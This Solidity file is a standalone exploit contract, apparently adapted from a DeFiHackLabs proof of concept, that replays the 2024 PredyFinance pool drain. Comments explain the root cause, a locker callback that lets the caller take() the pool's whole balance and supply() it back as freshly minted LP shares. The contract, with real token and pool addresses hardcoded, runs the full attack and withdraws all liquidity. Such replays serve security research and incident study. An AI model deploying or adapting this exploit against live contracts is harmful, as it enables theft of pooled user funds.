// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2024-05-PredyFinance).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (attacker = address(this); the trade callback `predyTradeAfterCallback`
// lives on the test itself), so there is no standalone contract to deploy.
// This contract is a faithful, self-contained copy of that inline attack so
// the playground can deploy it and record its entrypoint. Logic, constants,
// and struct shapes are copied verbatim from test/PredyFinance_exp.sol
// (PredyFinance.testExploit / PredyFinance.predyTradeAfterCallback).
//
// Root cause: PredyPool.trade() lets ANY caller register a brand-new pair
// (becoming that pair's "locker" for the duration of the call) and then
// invokes an arbitrary callback (`predyTradeAfterCallback`) on the caller
// BEFORE `finalizeLock()` re-checks the pool's token reserves. Inside that
// callback the locker is allowed to `take()` the pool's ENTIRE balance of
// both pair tokens (a locker-gated function, not amount-bounded to the
// trade), then immediately `supply()` those same tokens back in as freshly
// "deposited" liquidity. `supply()`/`receiveTokenAndMintBond()` mints LP
// (supply-token) shares purely from the transferred-in amount, with no check
// that the capital is new — so the attacker mints LP shares backed by
// tokens it only ever borrowed from the pool's own balance for the
// microsecond of the callback. `finalizeLock()` sees the reserve unchanged
// (take then supply nets to zero) and the trade completes successfully. The
// attacker is left holding LP shares (mintAmount == amount taken) redeemable
// 1:1 via `withdraw()`, walking away with the pool's entire liquidity.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

library AddPairLogic {
    struct AddPairParams {
        address marginId;
        address poolOwner;
        address uniswapPool;
        address priceFeed;
        bool whitelistEnabled;
        uint8 fee;
        Perp.AssetRiskParams assetRiskParams;
        InterestRateModel.IRMParams quoteIrmParams;
        InterestRateModel.IRMParams baseIrmParams;
    }
}

library Perp {
    struct AssetRiskParams {
        uint128 riskRatio;
        uint128 debtRiskRatio;
        int24 rangeSize;
        int24 rebalanceThreshold;
        uint64 minSlippage;
        uint64 maxSlippage;
    }
}

library InterestRateModel {
    struct IRMParams {
        uint256 baseRate;
        uint256 kinkRate;
        uint256 slope1;
        uint256 slope2;
    }
}

interface IPredyPool {
    struct TradeParams {
        uint256 pairId;
        uint256 vaultId;
        int256 tradeAmount;
        int256 tradeAmountSqrt;
        bytes extraData;
    }

    struct TradeResult {
        Payoff payoff;
        uint256 vaultId;
        int256 fee;
        int256 minMargin;
        int256 averagePrice;
        uint256 sqrtTwap;
        uint256 sqrtPrice;
    }

    struct Payoff {
        int256 perpEntryUpdate;
        int256 sqrtEntryUpdate;
        int256 sqrtRebalanceEntryUpdateUnderlying;
        int256 sqrtRebalanceEntryUpdateStable;
        int256 perpPayoff;
        int256 sqrtPayoff;
    }

    function registerPair(
        AddPairLogic.AddPairParams memory addPairParam
    ) external returns (uint256);

    function trade(
        TradeParams memory tradeParams,
        bytes memory settlementData
    ) external returns (TradeResult memory tradeResult);

    function take(bool isQuoteAsset, address to, uint256 amount) external;

    function supply(
        uint256 pairId,
        bool isQuoteAsset,
        uint256 supplyAmount
    ) external returns (uint256 finalSuppliedAmount);

    function withdraw(
        uint256 pairId,
        bool isQuoteAsset,
        uint256 withdrawAmount
    ) external returns (uint256 finalBurnAmount, uint256 finalWithdrawAmount);
}

contract PredyFinanceDrain {
    address private constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address private constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address private constant UNISWAP_POOL = 0xC6962004f452bE9203591991D15f6b388e09E8D0;
    IPredyPool private constant predyPool = IPredyPool(0x9215748657319B17fecb2b5D086A3147BFBC8613);

    function run() external {
        IERC20(USDC).approve(address(predyPool), type(uint256).max);
        IERC20(WETH).approve(address(predyPool), type(uint256).max);

        AddPairLogic.AddPairParams memory addPairParam = AddPairLogic.AddPairParams({
            marginId: WETH,
            poolOwner: address(this),
            uniswapPool: UNISWAP_POOL,
            priceFeed: address(this),
            whitelistEnabled: false,
            fee: 0,
            assetRiskParams: Perp.AssetRiskParams({
                riskRatio: 100_000_001,
                debtRiskRatio: 0,
                rangeSize: 1000,
                rebalanceThreshold: 500,
                minSlippage: 1_005_000,
                maxSlippage: 1_050_000
            }),
            quoteIrmParams: InterestRateModel.IRMParams({
                baseRate: 10_000_000_000_000_000,
                kinkRate: 900_000_000_000_000_000,
                slope1: 500_000_000_000_000_000,
                slope2: 1_000_000_000_000_000_000
            }),
            baseIrmParams: InterestRateModel.IRMParams({
                baseRate: 10_000_000_000_000_000,
                kinkRate: 900_000_000_000_000_000,
                slope1: 500_000_000_000_000_000,
                slope2: 1_000_000_000_000_000_000
            })
        });
        uint256 pairId = predyPool.registerPair(addPairParam); // register pair; the owner of the pair is this contract

        IPredyPool.TradeParams memory tradeParams =
            IPredyPool.TradeParams({pairId: pairId, vaultId: 0, tradeAmount: 0, tradeAmountSqrt: 0, extraData: ""});
        predyPool.trade(tradeParams, ""); // set this contract as the locker; triggers predyTradeAfterCallback

        predyPool.withdraw(pairId, true, IERC20(WETH).balanceOf(address(predyPool))); // withdraw the LP shares minted in the callback
        predyPool.withdraw(pairId, false, IERC20(USDC).balanceOf(address(predyPool))); // withdraw the LP shares minted in the callback
    }

    function predyTradeAfterCallback(
        IPredyPool.TradeParams memory tradeParams,
        IPredyPool.TradeResult memory tradeResult
    ) external {
        // Take the pool's entire WETH balance to this contract (locker-gated,
        // not bounded by the trade amount), then immediately supply the same
        // tokens back in as fresh liquidity -- minting LP shares 1:1 while
        // finalizeLock() sees the reserve unchanged.
        predyPool.take(true, address(this), IERC20(WETH).balanceOf(address(predyPool)));
        predyPool.supply(tradeParams.pairId, true, IERC20(WETH).balanceOf(address(this)));

        predyPool.take(false, address(this), IERC20(USDC).balanceOf(address(predyPool)));
        predyPool.supply(tradeParams.pairId, false, IERC20(USDC).balanceOf(address(this)));
    }

    function getSqrtPrice() external pure returns (uint256) {
        return 40_000_000_000;
    }
}
